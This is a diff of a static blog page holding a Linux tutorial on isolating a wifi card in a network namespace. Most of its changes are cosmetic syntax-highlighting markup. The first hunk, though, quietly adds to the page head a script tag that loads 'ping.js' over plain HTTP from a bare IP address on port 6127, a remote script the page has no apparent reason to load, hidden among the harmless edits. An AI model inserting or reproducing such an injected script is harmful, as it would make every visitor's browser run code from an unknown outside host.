@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -108,31 +110,31 @@ April 16, 2017
 <p>In a modern linux implementation we can use a <code>Network Namespace</code> which can create isolated full network stacks with their own routes and firewall rules.</p>
 <p>Any program running inside that namespace will see only that network stack which it is perfect for our purpose.</p>
 <p>Let’s create it first; pick a nice name and run:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip netns add <span class="s2">&quot;starbucks&quot;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span>add<span class="w"> </span><span class="s2">&quot;starbucks&quot;</span>
 </code></pre></div>
 
 <p>With that we have our <code>"starbucks"</code> namespace, empty for now.</p>
 <p>Now, we cannot put our wifi card into that namespace directly using the <code>ip</code> command.</p>
 <p>Typically you should use something like:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip link <span class="nb">set</span> DEVICE netns <span class="s2">&quot;starbucks&quot;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>DEVICE<span class="w"> </span>netns<span class="w"> </span><span class="s2">&quot;starbucks&quot;</span>
 </code></pre></div>
 
 <p>to move the <code>DEVICE</code> from the default namespace to the <code>"starbucks"</code> namespace, <strong>but no</strong>, we cannot use this.</p>
 <p>A wireless card is a little more exotic.</p>
 <p>First, we need to know the <em>physical id</em> of our card:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ iw dev <span class="s2">&quot;wlan0&quot;</span> info
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>iw<span class="w"> </span>dev<span class="w"> </span><span class="s2">&quot;wlan0&quot;</span><span class="w"> </span>info
 Interface
-    ifindex <span class="m">3</span>
-    wdev 0x1
-    addr &lt;mac-addr&gt;
-    <span class="nb">type</span> managed
-    wiphy &lt;phy-id&gt;
+<span class="w">    </span>ifindex<span class="w"> </span><span class="m">3</span>
+<span class="w">    </span>wdev<span class="w"> </span>0x1
+<span class="w">    </span>addr<span class="w"> </span>&lt;mac-addr&gt;
+<span class="w">    </span><span class="nb">type</span><span class="w"> </span>managed
+<span class="w">    </span>wiphy<span class="w"> </span>&lt;phy-id&gt;
 </code></pre></div>
 
 <p>where <code>"wlan0"</code> is the name of our wifi interface.</p>
 <p>If you are lazy like me then you may find useful this shortcut. The <code>iw</code> manpage warns that the output of this command shouldn’t be scrapped, but let’s be disobedient for a while:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="nv">PHYNUM</span><span class="o">=</span><span class="k">$(</span>iw dev <span class="s2">&quot;wlan0&quot;</span> info <span class="p">|</span> sed -n <span class="s1">&#39;s/^.*wiphy \([0-9]\+\)$/\1/p&#39;</span><span class="k">)</span>
-$ <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$PHYNUM</span><span class="s2">&quot;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nv">PHYNUM</span><span class="o">=</span><span class="k">$(</span>iw<span class="w"> </span>dev<span class="w"> </span><span class="s2">&quot;wlan0&quot;</span><span class="w"> </span>info<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;s/^.*wiphy \([0-9]\+\)$/\1/p&#39;</span><span class="k">)</span>
+$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PHYNUM</span><span class="s2">&quot;</span>
 &lt;phy-id&gt;
 </code></pre></div>
 
@@ -140,37 +142,37 @@ $ <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$P
 <p>To move a wifi card to a namespace we need to have a process already running there in the first place.</p>
 <p>Then we use <code>iw</code> to move the card.</p>
 <p>Here are the bits that do the magic:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip netns <span class="nb">exec</span> <span class="s2">&quot;starbucks&quot;</span> sleep <span class="m">3</span> <span class="p">&amp;</span>
-$ <span class="nv">PID</span><span class="o">=</span><span class="nv">$!</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="p">&amp;</span>
+$<span class="w"> </span><span class="nv">PID</span><span class="o">=</span><span class="nv">$!</span>
 
-$ iw phy <span class="s2">&quot;phy&lt;phy-id&gt;&quot;</span> <span class="nb">set</span> netns <span class="s2">&quot;</span><span class="nv">$PID</span><span class="s2">&quot;</span>
+$<span class="w"> </span>iw<span class="w"> </span>phy<span class="w"> </span><span class="s2">&quot;phy&lt;phy-id&gt;&quot;</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>netns<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PID</span><span class="s2">&quot;</span>
 </code></pre></div>
 
 <p>Just run a process in the namespace in background, grab its process id, and move the <code>"phy&lt;phy-id&gt;"</code> card to the same namespace of that process.</p>
 <h3 id="connect-to-a-wifi-network">Connect to a wifi network</h3>
 <p>With the card in its place, we are left is configure it. Pretty standard.</p>
 <p>First, up the interfaces in the <code>"starbucks"</code> namespace:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip netns <span class="nb">exec</span> <span class="s2">&quot;starbucks&quot;</span> rfkill unblock <span class="s2">&quot;&lt;phy-id&gt;&quot;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>rfkill<span class="w"> </span>unblock<span class="w"> </span><span class="s2">&quot;&lt;phy-id&gt;&quot;</span>
 
-$ ip -n <span class="s2">&quot;starbucks&quot;</span> link <span class="nb">set</span> <span class="s2">&quot;wlan0&quot;</span> up
-$ ip -n <span class="s2">&quot;starbucks&quot;</span> link <span class="nb">set</span> <span class="s2">&quot;lo&quot;</span> up
+$<span class="w"> </span>ip<span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="s2">&quot;wlan0&quot;</span><span class="w"> </span>up
+$<span class="w"> </span>ip<span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="s2">&quot;lo&quot;</span><span class="w"> </span>up
 </code></pre></div>
 
 <p>And connect to the access point.</p>
 <p>This of course will depend of the authentication method used by your local Starbucks.</p>
 <p>For an open network it is quite easy:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip netns <span class="nb">exec</span> <span class="s2">&quot;starbucks&quot;</span> iw <span class="s2">&quot;wlan0&quot;</span> connect -w <span class="s2">&quot;</span><span class="nv">$SSID</span><span class="s2">&quot;</span>
-wlan0 <span class="o">(</span>phy <span class="c1">#&lt;phy-id&gt;): connected to &lt;ap-mac-addr&gt;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>iw<span class="w"> </span><span class="s2">&quot;wlan0&quot;</span><span class="w"> </span>connect<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$SSID</span><span class="s2">&quot;</span>
+wlan0<span class="w"> </span><span class="o">(</span>phy<span class="w"> </span><span class="c1">#&lt;phy-id&gt;): connected to &lt;ap-mac-addr&gt;</span>
 </code></pre></div>
 
 <p>For a WPA/WPA2 protected network we need to generate a passphrase (and configuration) and then run <code>wpa_supplicant</code>, an agent that will handle the negotiation between your machine and the access point and it will keep it alive in background.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ wpa_passphrase <span class="s2">&quot;</span><span class="nv">$SSID</span><span class="s2">&quot;</span> &gt; <span class="s2">&quot;/tmp/starbucks_wpa_file&quot;</span>
-$ ip netns <span class="nb">exec</span> <span class="s2">&quot;starbucks&quot;</span> wpa_supplicant -B -i <span class="s2">&quot;wlan0&quot;</span> -c <span class="s2">&quot;/tmp/starbucks_wpa_file&quot;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>wpa_passphrase<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$SSID</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;/tmp/starbucks_wpa_file&quot;</span>
+$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>wpa_supplicant<span class="w"> </span>-B<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;wlan0&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;/tmp/starbucks_wpa_file&quot;</span>
 </code></pre></div>
 
 <p>In both cases, the <code>$SSID</code> is the name of the wifi network which you want to connect.</p>
 <p>To setup the IP address, the gateway and the DNS server we can use a DHCP client:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip netns <span class="nb">exec</span> <span class="s2">&quot;starbucks&quot;</span> dhclient <span class="s2">&quot;wlan0&quot;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>dhclient<span class="w"> </span><span class="s2">&quot;wlan0&quot;</span>
 </code></pre></div>
 
 <p>Or we can setup them manually:</p>
@@ -188,23 +190,23 @@ $ echo &quot;nameserver 8.8.8.8&quot; &gt; /etc/netns/starbucks/resolv.conf</cod
 <h3 id="surf-out-of-the-big-brother-sight"><em>Surf</em> out of the Big Brother sight</h3>
 <p>To navigate free, open your favorite browser (or other network application) <em>inside</em> the network namespace.</p>
 <p>To do that open a shell inside the namespace and log in as a normal user; only then open your browser:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip netns <span class="nb">exec</span> <span class="s2">&quot;starbucks&quot;</span> su -l <span class="s2">&quot;gehn&quot;</span>
-<span class="k">in</span> namespace<span class="o">)</span> firefox
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>su<span class="w"> </span>-l<span class="w"> </span><span class="s2">&quot;gehn&quot;</span>
+<span class="k">in</span><span class="w"> </span>namespace<span class="o">)</span><span class="w"> </span>firefox
 </code></pre></div>
 
 <p>This is an important detail: if you run <code>ip netns exec firefox</code> directly you will end up running your browser with root privileges.</p>
 <h3 id="close-everything">Close everything</h3>
 <p>In order to clean up everything, you need to ensure that all the processes running inside the namespace are killed and only then remove the namespace itself.</p>
 <p>Otherwise if some process keeps alive the namespace will not be deleted.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip netns pids <span class="s2">&quot;starbucks&quot;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -15 <span class="c1"># be polite</span>
-$ sleep <span class="m">12</span>
-$ ip netns pids <span class="s2">&quot;starbucks&quot;</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9  <span class="c1"># but being bad is more fun</span>
-$ ip netns delete <span class="s2">&quot;starbucks&quot;</span>
-$ rm -Rf /etc/netns/starbucks/
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span>pids<span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span><span class="nb">kill</span><span class="w"> </span>-15<span class="w"> </span><span class="c1"># be polite</span>
+$<span class="w"> </span>sleep<span class="w"> </span><span class="m">12</span>
+$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span>pids<span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span><span class="nb">kill</span><span class="w"> </span>-9<span class="w">  </span><span class="c1"># but being bad is more fun</span>
+$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span>delete<span class="w"> </span><span class="s2">&quot;starbucks&quot;</span>
+$<span class="w"> </span>rm<span class="w"> </span>-Rf<span class="w"> </span>/etc/netns/starbucks/
 </code></pre></div>
 
 <p>If you are a little paranoiac you can also block the wifi card before leaving the namespace to ensure that nobody will use it after that the namespace is gone:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ip netns <span class="nb">exec</span> <span class="s2">&quot;starbucks&quot;</span> rfkill block <span class="s2">&quot;&lt;phy-id&gt;&quot;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;starbucks&quot;</span><span class="w"> </span>rfkill<span class="w"> </span>block<span class="w"> </span><span class="s2">&quot;&lt;phy-id&gt;&quot;</span>
 </code></pre></div>
 
 <script src="https://utteranc.es/client.js"
